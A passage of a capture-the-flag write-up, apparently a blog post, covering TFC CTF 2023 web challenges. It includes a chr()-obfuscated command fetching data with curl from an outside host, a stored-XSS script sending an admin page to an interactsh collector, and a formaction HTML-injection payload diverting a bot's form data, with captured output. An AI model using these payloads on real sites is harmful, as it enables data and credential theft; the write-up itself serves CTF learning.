class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">117</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">106</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">106</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">51</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">55</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">53</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">55</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">37</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">115</span><span class="p">)}))</span>
</pre></table></code></div></div><p>Submitting this gave us the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{60c7502daf7f94106a295d7dea14b63df2048f8d}
</pre></table></code></div></div><h1 id="web">Web</h1><h2 id="baby-ducky-notes"><span class="mr-2">Baby Ducky Notes</span><a href="#baby-ducky-notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’re given the source code for this notes app. First we checked for where the flag is located.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>    <span class="n">query</span><span class="p">(</span><span class="n">con</span><span class="p">,</span> <span class="sa">f</span><span class="s">'''
    INSERT INTO posts (
        user_id,
        title,
        content,
        hidden
        ) VALUES (
            1,
            'Here is a ducky flag!',
            '</span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"FLAG"</span><span class="p">)</span><span class="si">}</span><span class="s">',
            0

    );
    '''</span><span class="p">)</span>
</pre></table></code></div></div><p>The flag is in the db as a post by the admin but the hidden column is set to 0 so it is publically viewable.</p><p>Checking the routes we find where we can view it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">web</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/posts/view/&lt;user&gt;'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
<span class="o">@</span><span class="n">auth_required</span>
<span class="k">def</span> <span class="nf">posts_view</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">posts</span> <span class="o">=</span> <span class="n">db_get_user_posts</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">username</span> <span class="o">==</span> <span class="n">user</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'posts.html'</span><span class="p">,</span> <span class="n">posts</span><span class="o">=</span><span class="n">posts</span><span class="p">)</span>
</pre></table></code></div></div><p>We see the flag by visiting http://challs.tfcctf.com:30395/posts/view/admin <img data-src="/images/thefewchosen/baby_ducky_notes.png" alt="screenshot of the flag" data-proofer-ignore> Flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{Adm1n_l0St_h1s_m1nd!} 
</pre></table></code></div></div><h2 id="baby-ducky-notes-revenge"><span class="mr-2">Baby Ducky Notes: Revenge</span><a href="#baby-ducky-notes-revenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The challenge has patched the previous issue but there is more to find. This time the flag is a hidden post so we can’t see it just by visiting the URL because hidden posts can only be seen by the user who uploaded them. We need to XSS the admin and get them to visit that page and send us the content. In the flask template for the posts page we see the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;p&gt; {{post.get('content') | safe}} &lt;/p&gt;
</pre></table></code></div></div><p>The usage of “safe” here means that flask will not sanitize the post content which allows us to XSS So we make a new post with this as the post content:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">http</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://challs.tfcctf.com:31743/posts/view/admin</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live</span><span class="dl">'</span><span class="p">)</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">data=</span><span class="dl">'</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">responseText</span><span class="p">));</span>
<span class="p">}</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>We get this response on our interactsh output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>POST / HTTP/2.0
Host: cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Length: 5
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost:1337
Referer: http://localhost:1337/
Sec-Ch-Ua: "Not/A)Brand";v="99", "HeadlessChrome";v="115", "Chromium";v="115"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/115.0.5790.110 Safari/537.36

data=
</pre></table></code></div></div><p>No data? Strange. The referer and origin reveal that the URL for the bot is not the same as the one we see so we must change our payload to account for that as the cookies are tied to that URL. Final payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">http</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://localhost:1337/posts/view/admin</span><span class="dl">'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">https://cj1r2h01ft1j3g1e3q6gkn5t3bkzmpudp.oast.live</span><span class="dl">'</span><span class="p">)</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">out</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">data=</span><span class="dl">'</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">responseText</span><span class="p">));</span>
<span class="p">}</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>We get back:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>data=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCI+CiAgICA8dGl0bGU+QmFieSBEdWNreSBOb3RlczogUmV2ZW5nZSE8L3RpdGxlPgogICAgPHNjcmlwdCBzcmM9Ii9zdGF0aWMvanMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSIvc3RhdGljL2pzL3JlcG9ydC5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20iPgogICAgPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3N0YXRpYy9jc3Mvc3R5bGVzLmNzcyIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgICAKICAgIDxuYXYgY2xhc3M9Im5hdmJhciI+CiAgICAgICAgPGRpdiBpZD0idHJhcGV6b2lkIj4KICAgICAgICAgICAgPGEgaHJlZj0iL2xvZ2luIiBjbGFzcz0iZXhwYW5kSG9tZSI+TG9naW48L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9yZWdpc3RlciIgY2xhc3M9ImV4cGFuZEhvbWUiPlJlZ2lzdGVyPC9hPgogICAgICAgICAgICA8YSBocmVmPSIvcG9zdHMvdmlldy9hZG1pbiIgY2xhc3M9ImV4cGFuZEhvbWUiPlZpZXc8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9wb3N0cy9jcmVhdGUiIGNsYXNzPSJleHBhbmRIb21lIj5DcmVhdGU8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJwb3N0c19saXN0Ij4KICAgIDx1bCBjbGFzcz0icG9zdHNfdWwiPgogICAgICAgIAogICAgICAgIDxsaT4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmxvZ19wb3N0Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lcl9jb3B5Ij4KICAgICAgICAgICAgICAgICAgPGgxPiBIZXJlIGlzIGEgZHVja3kgZmxhZyEgPC9oMT4KICAgICAgICAgICAgICAgICAgPGgzPiBhZG1pbiA8L2gzPgogICAgICAgICAgICAgICAgICA8cD4gVEZDQ1RGe0V2M3J5X2R1Q2tfa24wdzVfeFNzIX0gPC9wPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvbGk+CiAgICAgICAgIAogICAgPC91bD4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9InJlcG9ydCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSIgaWQ9ImFsZXJ0LW1zZyIgaGlkZGVuID48L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgaWQ9InJlcG9ydC1idG4iPlJlcG9ydCB0byBhZG1pbjwvYnV0dG9uPgogICAgPC9kaXY+CiAgICAKICAgIDxmb290ZXI+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLWNvbnRlbnQiPgogICAgICAgICAgICA8aDM+RGlzY2xhaW1lcjwvaDM+CiAgICAgICAgICAgIDxwPlRoaXMgY2hhbGxlbmdlIGlzIG1hZGUgdG8gYmUgaGFja2VkLiBBbnkgaW5kaWNhdGlvbiBvZiBwcm9wZXIgdXNhZ2Ugb3IgdW50YXBwZWQgYWN0aXZpdHkgd2lsbCByZXN1bHQgaW4gbGVnYWwgc2FuY3Rpb25zLiBIYXBweSBoYWNraW5nITwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXItYm90dG9tIj4KICAgICAgICAgICAgPHA+Y29weXJpZ2h0ICZjb3B5OyA8YSBocmVmPSIjIj5TYWdpIC8gVGhlIEZldyBDaG9zZW4gQ1RGIDIwMjMgPC9hPiAgPC9wPgogICAgICAgICAgICA8ZGl2IGlkPSJwb3QiPgogICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9zdGF0aWMvaW1hZ2VzL2R1Y2suZ2lmIiB3aWR0aD0xMDBweCBoZWlnaHQ9MTAwcHg+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CgogICAgPC9mb290ZXI+CiAgICAKPC9ib2R5PgoKPC9odG1sPg==
</pre></table></code></div></div><p>Base64 decoding that and we get the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>            &lt;div class="blog_post"&gt;
                &lt;div class="container_copy"&gt;
                  &lt;h1&gt; Here is a ducky flag! &lt;/h1&gt;
                  &lt;h3&gt; admin &lt;/h3&gt;
                  &lt;p&gt; TFCCTF{Ev3ry_duCk_kn0w5_xSs!} &lt;/p&gt;
                &lt;/div&gt;
</pre></table></code></div></div><h2 id="cookie-store"><span class="mr-2">Cookie Store</span><a href="#cookie-store" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is another XSS challenge. This time the bot types the flag into a form as we can see in the source code we’re given:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    <span class="n">client</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://localhost:1337/form_builder?fields=</span><span class="si">{</span><span class="n">fields</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="s">"title"</span><span class="p">).</span><span class="n">send_keys</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
    <span class="n">client</span><span class="p">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s">"""document.querySelector('input[type="submit"]').click();"""</span><span class="p">)</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</pre></table></code></div></div><p>Initially it seemed like this was going to be an XSS challenge. We can see we can get HTML injection as the javascript dynamically modifies the page in <code class="language-plaintext highlighter-rouge">templates/form_builder.html</code>:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>    <span class="kd">let</span> <span class="nx">form_html</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">fields_list</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">fields_list</span> <span class="o">=</span> <span class="nx">fields</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">,</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">fields_list</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">element</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">form_html</span> <span class="o">+=</span> <span class="s2">`&lt;div class="mb-4"&gt;
                &lt;label for="</span><span class="p">${</span><span class="nx">element</span><span class="p">}</span><span class="s2">" class="block text-gray-700 font-bold mb-2"&gt;</span><span class="p">${</span><span class="nx">element</span><span class="p">}</span><span class="s2">&lt;/label&gt;
                &lt;input type="text" name="</span><span class="p">${</span><span class="nx">element</span><span class="p">}</span><span class="s2">" id="</span><span class="p">${</span><span class="nx">element</span><span class="p">}</span><span class="s2">" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"&gt;
            &lt;/div&gt;`</span><span class="p">;</span>
        <span class="p">});</span>
    <span class="p">}</span>
    <span class="c1">// This will sanitize the input</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#form_builder</span><span class="dl">'</span><span class="p">).</span><span class="nx">setHTML</span><span class="p">(</span><span class="nx">form_html</span><span class="p">);</span>
</pre></table></code></div></div><p>This setHTML function didn’t work in my browser but it’s supposed to sanitize HTML to disallow most forms of XSS so script tags dont work and event attributes like onclick etc also don’t work.</p><p>We were able to get the flag with this payload:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">formaction=</span><span class="s">"http://cj2o7ibb7pn8qd9o99dg8w48u735kpf5k.oast.fun/lol"</span> <span class="nt">/&gt;</span>
</pre></table></code></div></div><p>The bot will click this button as its earlier on the page than the other. According to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/submit#formaction">docs from Mozilla</a> the formaction attribute takes precedence over the action attribute on the form element so the inputs in the form will go to our page instead of the intended one.</p><p>In the interactsh window we got the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
